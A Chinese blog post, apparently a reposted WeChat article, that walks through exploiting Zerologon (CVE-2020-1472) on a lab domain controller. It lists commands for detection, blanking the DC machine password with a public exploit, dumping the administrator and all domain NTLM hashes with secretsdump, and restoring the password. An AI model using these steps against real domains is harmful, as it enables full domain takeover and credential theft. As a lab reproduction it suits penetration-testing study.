> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/O4B10KuCpFKP9z5FfDi6sg)

前言漏洞介绍漏洞复现    0. 环境介绍    1. 漏洞检测（同时获取 netbios 名）    2. 将域控的机器账号密码置空    3. 还原机器用户密码    4. dump 域内 hash 参考链接

前言
--

本文不涉及漏洞原理分析，仅调研并使用工具。实战中遇到知道怎么利用该漏洞。

漏洞介绍
----

NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口，**被用于各种与用户和机器认证相关的任务**。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。

攻击者只需要定位域控主机名及 IP，并且可以访问域控，就可以在无需任何凭据的情况下 (**可在域外**) 拿到域管理员的权限。

漏洞复现
----

### 0. 环境介绍

```
# 域
god.org

# 域内主机
Windows 7
192.168.52.143

# 域控
Windows server 2008
192.168.52.138
主机名：owa
netbios名：owa

在Windows 7上将代理开出来，本地脚本利用

```

### 1. 漏洞检测（同时获取 netbios 名）

检测脚本：https://github.com/WiIs0n/Zerologon_CVE-2020-1472

获取 netbios 名：

```
nbtstat -A 192.168.52.138

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vhPIjadrtjtRVjOagMxtggAKd1smxK6rm8XwHXtt8iaGvibnCFhSEIkRQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vf6nd7CZSe3yCVia6vWwr9ribBa8a8ACCfn6W8WXDl2BHoC41d0AWuBAQ/640?wx_fmt=png)

漏洞检测：

```
python3 check_cve-2020-1472.py --ip 192.168.52.138 --name owa

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vibzgQ0RDIlEzh3gtBy5iaRMDskm5ff8f41XVFCh8q2TA5iaMEZY51TO6w/640?wx_fmt=png)

### 2. 将域控的机器账号密码置空

exp：https://github.com/dirkjanm/CVE-2020-1472

```
python3 cve-2020-1472-exploit.py owa 192.168.52.138

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8v1qh5h96OibFpEAErHuTRhA8oUMviam2gQPLcEkeAMRaSXEkeugPoxUew/640?wx_fmt=png)

利用机器用户及空密码先获取域管 administrator 用户的 hash，留作后面使用

```
python3 secretsdump.py -no-pass god.org/"owa$"@192.168.52.138 -history -just-dc-user administrator

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vQos9E9NvkdLhspicVcjtnyJkQ3EWjZNqh7BIr5YVaGRXarCse1C1bVw/640?wx_fmt=png)

### 3. 还原机器用户密码

获取旧的机器密码明文 hex

```
python3 secretsdump.py -no-pass god.org/administrator@192.168.52.138 -hashes :b19554738bacdd2e54a67d4e1335bb47

```

这会输出比较多数据，出现如下数据就可中止

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8v8iar1PaWjaQQfSTGACGgwdcHMGqEjrmtR6x4unpCWdquPGXI6gZibCow/640?wx_fmt=png)

利用获得的密码 hex 还原

```
python3 restorepassword.py god.org/owa@owa -target-ip 192.168.52.138 -hexpass f733010069c8d921ef4473956561c1aa367b720e51cc64aa2e11aaad3f0b639462120fbbfa10ae2ff93a57f13c7fa3a0faa0baf263f36525a0a1b90082f3c0b32eda13bf043e8e70ebf05bffa22cdfa72f2a58a0b11cc34a2f41843ef1f0334f7b1daba9bb3181644770c39d4f016c3fc41532599e7fb28963f3ed088b85d9b44b1ff548f259e41178531343d1ad7a65225053598d815b58172fde1eddc446001828cd4b28ae8187f745a77c0b28d6bf06fc07376deed1767ebe70676ff9908c96e3dc76a7406a7f0f3a7d65a3037a619b92d1a82930bdbd5595fffd0036912dc1ecd1bd4e28f5eb742a38f0fcd3e7a7

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vc8BkSOgVHhmujQEDzE0qTBicicHRzHPsQHU8yx8COmUaRzJuIudo43mA/640?wx_fmt=png)

校验是否还原成功：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vibow4Jd7BXBPib49Y5qt7YfjBsVVXTMjBrvrzcszWT7oSibWyCm7zAkGQ/640?wx_fmt=png)

### 4. dump 域内 hash

随后利用之前获取的域管 administrator hash 来 dump 域内用户的 ntlm hash

```
python3 secretsdump.py -no-pass god.org/administrator@192.168.52.138 -hashes :b19554738bacdd2e54a67d4e1335bb47 -just-dc-ntlm

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XV5eUE3zJ6ukSlibcxicdKs8vCYapQTclANSPMZic2yUcib8OYLPeNOzy13azx56dVC15moibR8SGjUInA/640?wx_fmt=png)

ntlm hash 为`31d6cfe0d16ae931b73c59d7e0c089c0`就是空密码，如 Guest 用户。

参考链接
----

https://atsud0.me/2020/10/24/CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/

https://github.com/WiIs0n/Zerologon_CVE-2020-1472

https://github.com/dirkjanm/CVE-2020-1472

https://github.com/Ridter/Intranet_Penetration_Tips#ZeroLogon